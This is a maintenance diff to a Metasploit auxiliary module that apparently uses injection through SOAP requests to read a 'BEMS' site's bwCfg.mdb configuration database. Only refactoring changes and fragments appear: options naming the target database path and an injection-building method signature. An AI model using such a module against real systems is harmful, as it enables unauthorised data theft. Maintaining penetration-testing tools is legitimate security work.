@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include REXML
@@ -42,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS']),
         OptString.new("WEB_DATABASE", [true, 'The path to the bwCfg.mdb database in the target', "C:\\WebAccess\\Node\\config\\bwCfg.mdb"])
-      ], self.class)
+      ])
   end
 
   def build_soap(injection)
@@ -319,6 +317,5 @@ class MetasploitModule < Msf::Auxiliary
 
     result
   end
-
 end
 
